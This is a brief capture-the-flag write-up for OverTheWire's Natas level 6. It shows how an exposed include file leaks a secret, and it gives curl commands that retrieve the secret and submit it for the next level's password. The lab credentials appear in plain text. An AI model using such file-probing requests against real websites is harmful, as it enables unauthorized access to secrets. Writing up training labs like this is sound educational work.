7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

This time the source code includes some logic for a secret to be entered. There was a line that said `include "includes/secret.inc";`, so I figured I would try the url `http://natas6.natas.labs.overthewire.org/includes/secret.inc`. Sure enough, it contained the secret: FOEIUWGHFEEUHOFUOIU

After inputting the secret, we get the password 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

We could accomplish the same results with curl:

```bash
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc # get secret

curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 --data "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query" http://natas6.natas.labs.overthewire.org | grep "password for natas7" # get password for level 7
```
